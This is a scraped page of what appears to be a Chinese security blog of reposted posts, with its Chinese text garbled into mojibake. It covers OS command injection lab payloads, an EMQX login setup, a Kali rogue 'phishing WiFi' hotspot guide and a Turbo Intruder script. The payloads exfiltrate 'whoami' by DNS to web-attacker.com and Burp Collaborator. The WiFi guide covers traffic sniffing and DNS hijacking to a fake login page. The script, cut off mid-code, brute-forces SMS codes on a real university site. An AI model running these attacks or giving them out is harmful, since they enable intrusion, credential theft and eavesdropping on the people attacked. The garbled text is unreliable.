<h4><span id="lab-blind-os-command-injection-with-output-redirection">Lab: Blind OS command injection with output redirection</span></h4><blockquote>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;email=1%401.com||whoami+&gt;+/var/www/images/whoami.txt||&amp;</span><br></pre></td></tr></table></figure>

<p><img src="/2023/12/07/OS-Command-Injection/4.png" alt="image"></p>
</blockquote>
<h3><span id="åˆ©ç”¨å¸¦å¤–oastæŠ€æœ¯åˆ©ç”¨ç›²ç›®çš„oså‘½ä»¤æ³¨å…¥">åˆ©ç”¨å¸¦å¤–ï¼ˆOASTï¼‰æŠ€æœ¯åˆ©ç”¨ç›²ç›®çš„OSå‘½ä»¤æ³¨å…¥</span></h3><blockquote>
<p>æ‚¨å¯ä»¥ä½¿ç”¨æ³¨å…¥çš„å‘½ä»¤ï¼Œé€šè¿‡OASTæŠ€æœ¯è§¦å‘ä¸æ‚¨æ§åˆ¶çš„ç³»ç»Ÿçš„å¸¦å¤–ç½‘ç»œäº¤äº’ã€‚ ä¾‹å¦‚ï¼š</p>
<p><code>&amp; nslookup kgji2ohoyw.web-attacker.com &amp;</code></p>
<p>æ­¤æœ‰æ•ˆè´Ÿè½½ä½¿ç”¨nslookupå‘½ä»¤å¯¹æŒ‡å®šçš„åŸŸè¿›è¡ŒDNSæŸ¥æ‰¾ã€‚ æ”»å‡»è€…å¯ä»¥ç›‘è§†æ˜¯å¦å‘ç”Ÿäº†æŒ‡å®šçš„æŸ¥æ‰¾ï¼Œä»è€Œæ£€æµ‹åˆ°å‘½ä»¤å·²æˆåŠŸæ³¨å…¥ã€‚</p>
</blockquote>
<h4><span id="lab-blind-os-command-injection-with-out-of-band-interaction">Lab: Blind OS command injection with out-of-band interaction</span></h4><blockquote>
<p><img src="/2023/12/07/OS-Command-Injection/5.png" alt="image"></p>
<p>å¸¦å¤–é€šé“è¿˜æä¾›äº†ä¸€ç§ä»æ³¨å…¥çš„å‘½ä»¤ä¸­æå–è¾“å‡ºçš„ç®€ä¾¿æ–¹æ³•ï¼š<br> (æ ¹æœ¬åˆ«å•¥ç”¨)</p>
<p><code>&amp; nslookup </code>whoami<code>.kgji2ohoyw.web-attacker.com &amp;</code></p>
<p>è¿™å°†å¯¼è‡´å¯¹DNSçš„æ”»å‡»è€…æ‰€åœ¨åŸŸè¿›è¡ŒåŸŸåæŸ¥è¯¢ï¼Œå…¶ä¸­åŒ…å«whoamiå‘½ä»¤çš„ç»“æœï¼š</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wwwuser.kgji2ohoyw.web-attacker.com</span><br></pre></td></tr></table></figure>
</blockquote>
<h4><span id="lab-blind-os-command-injection-with-out-of-band-data-exfiltration">Lab: Blind OS command injection with out-of-band data exfiltration</span></h4><blockquote>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">email=1%401.com||nslookup+`whoami`.132kftea48t801xjselcncwfp6vwjl.burpcollaborator.net||</span><br></pre></td></tr></table></figure>

<p><img src="/2023/12/07/OS-Command-Injection/6.png" alt="image"></p>
</blockquote>
<h2><span id="æ³¨å…¥oså‘½ä»¤çš„æ–¹å¼">æ³¨å…¥OSå‘½ä»¤çš„æ–¹å¼</span></h2><blockquote>
<p>å„ç§shellå­—ç¬¦å¯ç”¨äºæ‰§è¡ŒOSå‘½ä»¤æ³¨å…¥æ”»å‡»ã€‚</p>
<p>è®¸å¤šå­—ç¬¦ç”¨ä½œå‘½ä»¤åˆ†éš”ç¬¦ï¼Œä½¿å‘½ä»¤å¯ä»¥é“¾æ¥åœ¨ä¸€èµ·ã€‚ ä»¥ä¸‹å‘½ä»¤åˆ†éš”ç¬¦å¯åœ¨åŸºäºWindowså’ŒUnixçš„ç³»ç»Ÿä¸Šè¿è¡Œï¼š</p>
<pre><code>&amp;
&amp;&amp;
|
||
</code></pre>
<p>ä»¥ä¸‹å‘½ä»¤åˆ†éš”ç¬¦ä»…åœ¨åŸºäºUnixçš„ç³»ç»Ÿä¸Šèµ·ä½œç”¨ï¼š</p>
<pre><code>;
Newline (0x0a or \n)
</code></pre>
<p>åœ¨åŸºäºUnixçš„ç³»ç»Ÿä¸Šï¼Œæ‚¨è¿˜å¯ä»¥ä½¿ç”¨åå¼•å·æˆ–ç¾å…ƒå­—ç¬¦åœ¨åŸå§‹å‘½ä»¤ä¸­å†…åµŒæ‰§è¡Œæ³¨å…¥å‘½ä»¤ï¼š ï¼ˆåŸæ¥å¦‚æ­¤ï¼Œwindowsä¸èƒ½ç”¨åå¼•å·ï¼‰</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">`injected-command`</span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">( injected-command )</span></span><br></pre></td></tr></table></figure>

<p>è¯·æ³¨æ„ï¼Œä¸åŒçš„shellå…ƒå­—ç¬¦å…·æœ‰ç»†å¾®ä¸åŒçš„è¡Œä¸ºï¼Œè¿™äº›è¡Œä¸ºå¯èƒ½ä¼šå½±å“å®ƒä»¬æ˜¯å¦åœ¨æŸäº›æƒ…å†µä¸‹èµ·ä½œç”¨ï¼Œä»¥åŠå®ƒä»¬æ˜¯å¦å…è®¸å¸¦å†…æ£€ç´¢å‘½ä»¤è¾“å‡ºæˆ–ä»…å¯¹ç›²æ³¨ä½¿ç”¨æœ‰ç”¨ã€‚</p>
<p>æœ‰æ—¶ï¼Œæ‚¨æ§åˆ¶çš„è¾“å…¥ä¼šå‡ºç°åœ¨åŸå§‹å‘½ä»¤çš„å¼•å·ä¸­ã€‚ åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œéœ€è¦å…ˆä½¿ç”¨å¼•å·ç»ˆæ­¢ä¸Šä¸‹æ–‡ï¼ˆä½¿ç”¨â€æˆ–â€™ï¼‰ï¼Œç„¶åå†ä½¿ç”¨é€‚å½“çš„å¤–å£³å…ƒå­—ç¬¦æ¥æ’å…¥æ–°å‘½ä»¤ã€‚</p>
</blockquote>
<h2><span id="å¦‚ä½•é˜²æ­¢oså‘½ä»¤æ³¨å…¥æ”»å‡»">å¦‚ä½•é˜²æ­¢OSå‘½ä»¤æ³¨å…¥æ”»å‡»</span></h2><blockquote>
<p>åˆ°ç›®å‰ä¸ºæ­¢ï¼Œé˜²æ­¢OSå‘½ä»¤æ³¨å…¥æ¼æ´çš„æœ€æœ‰æ•ˆæ–¹æ³•æ˜¯æ°¸è¿œä¸è¦ä»åº”ç”¨ç¨‹åºå±‚ä»£ç ä¸­è°ƒç”¨OSå‘½ä»¤ã€‚ å‡ ä¹åœ¨æ¯ç§æƒ…å†µä¸‹ï¼Œéƒ½æœ‰ä½¿ç”¨æ›´å®‰å…¨çš„å¹³å°APIæ¥å®ç°æ‰€éœ€åŠŸèƒ½çš„æ›¿ä»£æ–¹æ³•ã€‚</p>
<p>å¦‚æœè®¤ä¸ºæ— æ³•é€šè¿‡ç”¨æˆ·æä¾›çš„è¾“å…¥è°ƒå‡ºOSå‘½ä»¤ï¼Œåˆ™å¿…é¡»æ‰§è¡Œå¼ºå¤§çš„è¾“å…¥éªŒè¯ã€‚ æœ‰æ•ˆéªŒè¯çš„ä¸€äº›ç¤ºä¾‹åŒ…æ‹¬ï¼š</p>
<ul>
<li>æ ¹æ® å…è®¸å€¼ çš„ç™½åå•è¿›è¡ŒéªŒè¯ã€‚</li>
<li>éªŒè¯è¾“å…¥æ˜¯å¦ä¸ºæ•°å­—ã€‚</li>
<li>éªŒè¯è¾“å…¥ä»…åŒ…å«å­—æ¯æ•°å­—å­—ç¬¦ï¼Œä¸åŒ…å«å…¶ä»–è¯­æ³•æˆ–ç©ºæ ¼ã€‚</li>
</ul>
<p>åˆ‡å‹¿å°è¯•é€šè¿‡è½¬ä¹‰shellå…ƒå­—ç¬¦æ¥æ¸…ç†è¾“å…¥ã€‚ å®é™…ä¸Šï¼Œè¿™å¤ªå®¹æ˜“å‡ºé”™ï¼Œå®¹æ˜“è¢«ç†Ÿç»ƒçš„æ”»å‡»è€…ç»•å¼€ã€‚</p>
</blockquote>


        

        
            <div class="tags">
                <a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/RCE/" rel="tag">RCE</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a>
            </div>
        

    </section>
</article>
  
    <article class="post ">

    
        <h2 class="title">
            <a href="/2023/12/07/EMQX-Server-Login/">
                é…ç½®EMQXæœåŠ¡å™¨ç”¨æˆ·å/å¯†ç æ–¹å¼ç™»å½•
            </a>
        </h2>
    
    <time>
        Dec 7, 2023
    </time>
    <section class="content">
        <h1><span id="é…ç½®emqxæœåŠ¡å™¨ç”¨æˆ·åx2få¯†ç æ–¹å¼ç™»å½•">é…ç½®EMQXæœåŠ¡å™¨ç”¨æˆ·å&#x2F;å¯†ç æ–¹å¼ç™»å½•</span></h1><blockquote>
<p>æœ¬æ–‡è½¬è‡ª<a target="_blank" rel="noopener" href="https://blog.csdn.net/cw_huang/article/details/105815345">GEEK.æ”»åŸç‹®</a> å¹¶ä½œè¡¥å……</p>
</blockquote>
<h3><span id="é…ç½®ç¯å¢ƒ">é…ç½®ç¯å¢ƒ</span></h3><blockquote>
<p><strong>ç³»ç»Ÿï¼š</strong><a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=ubuntu&spm=1001.2101.3001.7020">ubuntu</a> 18.04server lts</p>
<p><strong>EMQXç‰ˆæœ¬ï¼šv4.0.6</strong></p>
</blockquote>
<h3><span id="åœæ­¢æœåŠ¡">åœæ­¢æœåŠ¡</span></h3><blockquote>
<p><code>emqx stop</code></p>
</blockquote>
<h3><span id="ç¼–è¾‘ç”¨æˆ·åå¯†ç é…ç½®æ–‡ä»¶">ç¼–è¾‘ç”¨æˆ·åå¯†ç é…ç½®æ–‡ä»¶</span></h3><blockquote>
<p><code>vim ./etc/emqx/plugins/emqx_auth_username.conf</code></p>
<p>å¢åŠ ç”¨æˆ·åã€å¯†ç ï¼Œå¯†ç ç®—æ³•æ”¹ä¸ºplainï¼Œé€ä¼ </p>
<p><img src="/2023/12/07/EMQX-Server-Login/1.png" alt="image"></p>
</blockquote>
<h3><span id="å…³é—­åŒ¿åç™»å½•">å…³é—­åŒ¿åç™»å½•</span></h3><blockquote>
<p><code>vim /etc/emqx/emqx.conf</code></p>
<p>æŸ¥æ‰¾allow_anonymousï¼Œä¿®æ”¹ä¸ºfalse</p>
<p><img src="/2023/12/07/EMQX-Server-Login/2.png" alt="image"></p>
<p>å¯åŠ¨emqxæœåŠ¡</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">emqx start</span><br></pre></td></tr></table></figure>



<p>è¿›å…¥åå°ç®¡ç†ç•Œé¢ï¼Œå¯åŠ¨ç”¨æˆ·åå¯†ç è®¤è¯ã€‚</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://æœåŠ¡å™¨IP:18083</span><br></pre></td></tr></table></figure>

<p><img src="/2023/12/07/EMQX-Server-Login/3.png" alt="image"></p>
</blockquote>
<h3><span id="æ­¤æ—¶ä½¿ç”¨mqttä¹‹å‰çš„åŒ¿åæ–¹å¼çš„é…ç½®å·²ç»æ— æ³•ç™»å½•">æ­¤æ—¶ï¼Œä½¿ç”¨MQTTä¹‹å‰çš„åŒ¿åæ–¹å¼çš„é…ç½®ï¼Œå·²ç»æ— æ³•ç™»å½•</span></h3><blockquote>
<p><img src="/2023/12/07/EMQX-Server-Login/4.png" alt="image"></p>
<p>MQTT.FXä¸Šï¼Œæ·»åŠ ç”¨æˆ·åå¯†ç ï¼š</p>
<p><img src="/2023/12/07/EMQX-Server-Login/5.png" alt="image"></p>
<p>æ­¤æ—¶å¯ä»¥é€šè¿‡ç”¨æˆ·åå¯†ç ç™»å½•ï¼Œè®¢é˜…ä¸»é¢˜</p>
<p><img src="/2023/12/07/EMQX-Server-Login/6.png" alt="image"></p>
<p>åŒæ ·çš„æ–¹å¼ï¼Œæˆ‘ä»¬éœ€è¦å†æ·»åŠ ä¸€ä¸ªç”¨æˆ·ï¼Œç”¨äºä¸¤ä¸ªç”¨æˆ·ä¹‹é—´é€šè®¯ã€‚</p>
<p>æˆ‘ä»¬å¯ä»¥ä»æœåŠ¡å™¨ç«¯ç™»å½•ä¸€ä¸ªç”¨æˆ·ï¼Œå‘MQTT.FXå®¢æˆ·ç«¯è®¢é˜…çš„TOPICå‘é€ä¿¡æ¯ã€‚å¯ä»¥çœ‹åˆ°æ­£å¸¸æ”¶åˆ°ã€‚</p>
<p><img src="/2023/12/07/EMQX-Server-Login/7.png" alt="image"></p>
</blockquote>


        

        
            <div class="tags">
                <a class="tag-none-link" href="/tags/EMQX/" rel="tag">EMQX</a><a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a>
            </div>
        

    </section>
</article>
  
    <article class="post ">

    
        <h2 class="title">
            <a href="/2023/12/06/Fishing-WiFi/">
                kaliæ­å»ºé’“é±¼WiFi
            </a>
        </h2>
    
    <time>
        Dec 6, 2023
    </time>
    <section class="content">
        <h1><span id="kaliæ­å»ºé’“é±¼wifi">kaliæ­å»ºé’“é±¼WiFi</span></h1><blockquote>
<p>æœ¬æ–‡è½¬è‡ª<a target="_blank" rel="noopener" href="https://blog.bbskali.cn/2179.html">é€é¥å­</a> å¹¶ä½œè¡¥å……</p>
<p>å¦‚ä½•åœ¨kaliä¸‹å¿«é€Ÿæ­å»ºé’“é±¼WiFiå‘¢ï¼Ÿå…¨ç½‘æœ€ç®€å•æœ€è¯¦ç»†çš„æ•™ç¨‹æ ¸èƒ½æ¥è¢­ã€‚ä¸€èµ·æ¥çœ‹çœ‹å§ã€‚</p>
</blockquote>
<h2><span id="å‡†å¤‡">å‡†å¤‡</span></h2><blockquote>
<ul>
<li>USBæ— çº¿ç½‘å¡ï¼ˆæ¨è8187 3070ï¼‰</li>
<li>hostapd dnsmasq apache2</li>
<li>kali2020(æœ€æ–°ç‰ˆ)</li>
</ul>
</blockquote>
<h3><span id="é…ç½®æ— çº¿ç½‘å¡">é…ç½®æ— çº¿ç½‘å¡</span></h3><blockquote>
<p>åœ¨ç»ˆç«¯æ‰§è¡Œ <code>ifconfig</code>æŸ¥çœ‹æ˜¯å¦æœ‰ <code>wlan0</code>å¦‚æœå­˜åœ¨ï¼Œæˆ‘ä»¬éœ€è¦æ¿€æ´»ä¸ºç›‘å¬æ¨¡å¼ã€‚æ‰§è¡Œå‘½ä»¤ï¼š</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">airmon-ng start wlan0</span><br></pre></td></tr></table></figure>

<p><img src="/2023/12/06/Fishing-WiFi/1.png" alt="image" title="å¼€å¯ç½‘å¡ç›‘å¬æ¨¡å¼"></p>
</blockquote>
<h3><span id="é…ç½®hostapd">é…ç½®hostapd</span></h3><blockquote>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim hostapd.conf</span><br></pre></td></tr></table></figure>

<p>å†™å…¥ä¸‹é¢å†…å®¹</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">interface=wlan0mon</span><br><span class="line">driver=nl80211</span><br><span class="line">ssid=Chinanet <span class="comment">#æ— çº¿åç§° éšæ„å³å¯</span></span><br><span class="line">hw_mode=g</span><br><span class="line">channel=6</span><br><span class="line">macaddr_acl=0</span><br><span class="line">ignore_broadcast_ssid=0</span><br></pre></td></tr></table></figure>

<p><img src="/2023/12/06/Fishing-WiFi/2.png" alt="image"></p>
</blockquote>
<h3><span id="é…ç½®dnsmasqæ–‡ä»¶">é…ç½®dnsmasqæ–‡ä»¶</span></h3><blockquote>
<p>ç»ˆç«¯æ‰§è¡Œ</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim dnsmasq.conf</span><br></pre></td></tr></table></figure>

<p>å†™å…¥å†…å®¹å¦‚ä¸‹ï¼š</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">interface=wlan0mon</span><br><span class="line">dhcp-range=192.168.1.2, 192.168.1.30, 255.255.255.0, 12h</span><br><span class="line">dhcp-option=3, 192.168.1.1</span><br><span class="line">dhcp-option=6, 192.168.1.1</span><br><span class="line">server=8.8.8.8</span><br><span class="line">log-queries</span><br><span class="line">log-dhcp</span><br><span class="line">listen-address=127.0.0.1</span><br></pre></td></tr></table></figure>

<p><img src="/2023/12/06/Fishing-WiFi/3.png" alt="image"></p>
</blockquote>
<h3><span id="é…ç½®é˜²ç«å¢™å’Œç«¯å£è½¬å‘">é…ç½®é˜²ç«å¢™å’Œç«¯å£è½¬å‘</span></h3><blockquote>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">iptables --table nat --append POSTROUTING --out-interface eth0 -j MASQUERADE</span><br><span class="line">iptables --append FORWARD --in-interface wlan0mon -j ACCEPT</span><br><span class="line"><span class="built_in">echo</span> 1 &gt; /proc/sys/net/ipv4/ip_forward</span><br></pre></td></tr></table></figure>

<p><img src="/2023/12/06/Fishing-WiFi/4.png" alt="image"></p>
<p>è¿™æ ·åšçš„ç›®çš„æ˜¯ä¿è¯æˆ‘ä»¬çš„é±¼å„¿èƒ½å¤Ÿæ­£å¸¸ä¸Šç½‘ã€‚</p>
</blockquote>
<h3><span id="ç»™æ— çº¿ç½‘å¡åˆ†é…ipåœ°å€">ç»™æ— çº¿ç½‘å¡åˆ†é…IPåœ°å€</span></h3><blockquote>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ifconfig wlan0mon up 192.168.1.1 netmask 255.255.255.0</span><br><span class="line">route add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.1</span><br></pre></td></tr></table></figure>
</blockquote>
<h3><span id="å¯åŠ¨é’“é±¼çƒ­ç‚¹">å¯åŠ¨é’“é±¼çƒ­ç‚¹</span></h3><blockquote>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hostapd hostapd.conf</span><br></pre></td></tr></table></figure>

<p><img src="/2023/12/06/Fishing-WiFi/5.png" alt="image"></p>
<p>è¿™æ ·æˆ‘ä»¬ä¾¿å¯ä»¥çœ‹åˆ°æœ‰ä¸€ä¸ª <code>china-net</code>çš„çƒ­ç‚¹ï¼Œä½†æ˜¯ä¸èƒ½è¿æ¥ï¼Œä¸è¦ç€æ€¥ï¼Œæˆ‘ä»¬å¯åŠ¨dnsmasqå³å¯ã€‚</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dnsmasq -C dnsmasq.conf -d</span><br></pre></td></tr></table></figure>



<p>è¿™æ ·ï¼Œæˆ‘ä»¬çš„çƒ­ç‚¹ä¾¿å¯ä»¥æ­£å¸¸è¿æ¥å¹¶ä¸Šç½‘äº†ã€‚</p>
<p><img src="/2023/12/06/Fishing-WiFi/6.png" alt="image"></p>
<p>å·¦è¾¹ä¸ºè¿æ¥çš„è®¾å¤‡ï¼Œå³è¾¹æœ‰è®¾å¤‡è®¿é—®çš„ç½‘ç«™ä¿¡æ¯ã€‚</p>
</blockquote>
<h2><span id="é«˜çº§æ“ä½œ">é«˜çº§æ“ä½œ</span></h2><h3><span id="å—…æ¢ç›®æ ‡å›¾ç‰‡">å—…æ¢ç›®æ ‡å›¾ç‰‡</span></h3><blockquote>
<p>åœ¨ç»ˆç«¯æ‰§è¡Œ</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">driftnet -i wlan0mon</span><br></pre></td></tr></table></figure>



<p>ä¾¿å¯ä»¥çœ‹åˆ°ç›®æ ‡è®¿é—®çš„ç«™ç‚¹å›¾ç‰‡ä¿¡æ¯ã€‚</p>
<p><img src="/2023/12/06/Fishing-WiFi/7.png" alt="image"></p>
</blockquote>
<h3><span id="ä¸­é—´äººæ”»å‡»">ä¸­é—´äººæ”»å‡»</span></h3><h4><span id="åŸŸåé‡å®šå‘">åŸŸåé‡å®šå‘</span></h4><blockquote>
<p>ä¿®æ”¹ <code>/etc/ettercap/etter.dns</code>æ–‡ä»¶ï¼Œæ·»åŠ å†…å®¹å¦‚ä¸‹ï¼š</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">baidu.com      A   192.168.1.1</span><br><span class="line">*.baidu.com    A   192.168.1.1</span><br><span class="line">www.baidu.com  PTR 192.168.1.1</span><br></pre></td></tr></table></figure>



<p>å³ï¼Œå½“æˆ‘ä»¬è®¿é—®ç™¾åº¦ï¼Œè‡ªåŠ¨è·³è½¬åˆ°æœ¬åœ°ã€‚<br>å¼€å¯æœ¬åœ° <code>apache</code></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service apache2 start</span><br></pre></td></tr></table></figure>



<p>å°†åšå¥½çš„é’“é±¼é¡µé¢æ”¾åˆ° <code>/var/www/html</code>ç›®å½•ä¸‹ï¼Œç„¶åç»ˆç«¯æ‰§è¡Œ <code>ettercap -G</code>åˆ©ç”¨ <code>ettercap</code>è¿›è¡ŒDNSåŠ«æŒï¼Œå…·ä½“åšæ³•è¿™é‡Œä¸å†è¯‰è¿°ã€‚</p>
<p><img src="/2023/12/06/Fishing-WiFi/8.png" alt="image" title="ä»¿ç”µä¿¡é’“é±¼é¡µé¢"></p>
<p>å½“ç„¶ï¼Œä½ ä¹Ÿå¯ä»¥å¯¹ç›®æ ‡è¿›è¡Œæ•°æ®åŒ…çš„æ•è·å’Œåˆ†æï¼Œæˆ‘ä»¬è¿™é‡Œä¹Ÿä¸å†è¯´äº†ã€‚</p>
</blockquote>
<h3><span id="å¡«ä¸ªå‘">å¡«ä¸ªå‘</span></h3><blockquote>
<p>æœ‰ä¸å°‘äººæ­å»ºå®Œæˆåï¼Œååº”ä¸Šä¸äº†ç½‘ï¼Œæ˜¯å› ä¸ºdnså†²çªäº†ã€‚å¦‚ä½ å®¶çš„è·¯ç”±å™¨çš„ç½‘æ®µæ˜¯<code>192.168.1.1/24</code>è€Œåœ¨dnsçš„é…ç½®æ–‡ä»¶ä¸­<code>dhcp-option=3, 192.168.1.1</code>è¿™æ ·ä¼šå†²çªï¼Œè§£å†³åŠæ³•å¾ˆç®€å•ï¼ŒæŠŠ<code>192.168.1.1</code>æ”¹æˆå…¶ä»–ç½‘æ®µå°±è¡Œäº†ï¼Œå¦‚<code>192.168.5.1</code>ï¼Œä½†æ˜¯åé¢çš„è§„åˆ™ä¹Ÿè¦æ”¹ã€‚æœ€ç®€å•çš„æ–¹æ³•å°±æ˜¯ç™»é™†è·¯ç”±å™¨ï¼Œå°†<code>lan</code>å£åœ°å€<code>192.168.1.1</code>æ”¹æ‰å°±è¡Œäº†ï¼</p>
</blockquote>


        

        
            <div class="tags">
                <a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/Fishing/" rel="tag">Fishing</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a><a class="tag-none-link" href="/tags/WiFi/" rel="tag">WiFi</a>
            </div>
        

    </section>
</article>
  
    <article class="post ">

    
        <h2 class="title">
            <a href="/2023/12/06/Burpsuite-Turbo-Intruder/">
                è®°ä¸€æ¬¡ä½¿ç”¨Burpsuiteä¸‹çš„æ’ä»¶Turbo intruderè¿›è¡Œå®æˆ˜
            </a>
        </h2>
    
    <time>
        Dec 6, 2023
    </time>
    <section class="content">
        <h1><span id="è®°ä¸€æ¬¡ä½¿ç”¨burpsuiteä¸‹çš„æ’ä»¶turbo-intruderè¿›è¡Œå®æˆ˜">è®°ä¸€æ¬¡ä½¿ç”¨Burpsuiteä¸‹çš„æ’ä»¶Turbo intruderè¿›è¡Œå®æˆ˜</span></h1><blockquote>
<p>æœ¬æ–‡è½¬è‡ª<a target="_blank" rel="noopener" href="https://www.freebuf.com/sectool/243953.html">é…·é…·çš„ç¹æ˜Ÿ</a> å¹¶ä½œè¡¥å……</p>
<p>ç›¸ä¿¡å¾ˆå¤šå¸ˆå‚…åœ¨è¿›è¡Œæ¸—é€æµ‹è¯•æˆ–è€…æ¼æ´æŒ–æ˜çš„æ—¶å€™éƒ½ä¼šç”¨åˆ°burpsuiteè¿™æ¬¾ç¥å™¨ï¼Œä½†æ˜¯ä¸çŸ¥é“å¸ˆå‚…ä»¬ç”¨è¿‡burpsuiteé‡Œé¢ä¸€æ¬¾å«turbo intruderçš„æ’ä»¶ä¹ˆ</p>
<p>ä¸ç®¡è¿™äº›ï¼Œä»Šå¤©çœ‹äº†è¿™ç¯‡æ–‡ç« çš„å¸ˆå‚…æˆ‘ç›¸ä¿¡ä¹Ÿä¼šå¯¹è¿™æ¬¾æ’ä»¶æœ‰å…´è¶£</p>
<p>å®‰è£…æ•™ç¨‹ç­‰ç­‰çš„æ–‡ç« åœ¨å„å¤§è®ºå›ä¸€æ‰¾ä¸€å¤§å †ï¼Œä½†æ˜¯å®æˆ˜çš„åˆæœ‰å‡ ä¸ªå‘¢ï¼Œå¯¹å§ï¼Ÿ</p>
<p>ä»Šå¤©ç¹æ˜Ÿå°±ç»™å¤§å®¶å¸¦æ¥turbo intruderå®æˆ˜æ•™ç¨‹</p>
<p>ç›®æ ‡ç«™ç‚¹æ˜¯æŸç§‘æŠ€å¤§å­¦çš„ç«™ç‚¹</p>
<p>é¦–å…ˆæˆ‘ä»¬æ‰“å¼€è¿™ä¸ªç«™ç‚¹çš„é¦–é¡µçœ‹çœ‹</p>
<p><img src="/2023/12/06/Burpsuite-Turbo-Intruder/1.png" alt="image"></p>
<p>å¯ä»¥çœ‹åˆ°æœ‰æ³¨å†ŒæŒ‰é’®</p>
<p>æˆ‘ä»¬ç‚¹è¿›å»çœ‹çœ‹</p>
<p><img src="/2023/12/06/Burpsuite-Turbo-Intruder/2.png" alt="image"></p>
<p>ç„¶ååœ¨è¿™é‡Œæ¨èå¸ˆå‚…ä»¬ä¸€ä¸ªå¾ˆä¾¿åˆ©çš„çŸ­ä¿¡æ¥æ”¶å¹³å°</p>
<p><a target="_blank" rel="noopener" href="https://www.bfkdim.com/">https://www.bfkdim.com/</a></p>
<p><img src="/2023/12/06/Burpsuite-Turbo-Intruder/3.png" alt="image"></p>
<p>å¥½çš„ï¼Œç»§ç»­</p>
<p>æ‰‹æœºå·é‚£é‡Œæˆ‘ä»¬å°±å¡«è¿™ä¸ªå¹³å°é‡Œé¢çš„ä¸€ä¸ªæ‰‹æœºå·</p>
<p>å¼€å¯æˆ‘ä»¬çš„burpsuiteï¼Œç‚¹â€œç«‹å³æ³¨å†Œâ€æŠ“ä¸ªåŒ…</p>
<p><img src="/2023/12/06/Burpsuite-Turbo-Intruder/4.png" alt="image"></p>
<p>é€‰æ‹©éªŒè¯ç å³é”®</p>
<p><img src="/2023/12/06/Burpsuite-Turbo-Intruder/5.png" alt="image"></p>
<p>å‘é€åˆ°turbo intruder</p>
<p>æˆ‘ä»¬è¿™è¾¹ä¸åŒå®˜æ–¹çš„ä»£ç </p>
<p>çˆ†ç ´éªŒè¯ç åªéœ€ç”Ÿæˆæ•°å­—çš„æ‰€æœ‰æ’åˆ—ç»„åˆå°±å¯ä»¥äº†ï¼Œå¯ä»¥é€šè¿‡ä»¥ä¸‹ä»£ç æ¥ç”Ÿæˆ</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">from itertools import product</span><br><span class="line"></span><br><span class="line">def brute_veify_code(target, engine, length):</span><br><span class="line">   pattern = &#x27;1234567890&#x27;</span><br><span class="line">   for i in list(product(pattern, repeat=length)):</span><br><span class="line">        code =  &#x27;&#x27;.join(i)</span><br><span class="line">        engine.queue(target.req, code)</span><br><span class="line"></span><br><span class="line">def queueRequests(target, wordlists):</span><br><span class="line">   engine = RequestEngine(endpoint=target.endpoint,</span><br><span class="line">           concurrentConnections=30,</span><br><span class="line">           requestsPerConnection=100,</span><br><span class="line">           pipeline=True</span><br><span class="line">           )</span><br><span class="line">   brute_veify_code(target, engine, 6)</span><br><span class="line"></span><br><span class="line">def handleResponse(req, interesting):</span><br><span class="line"># currently available attributes are req.status, 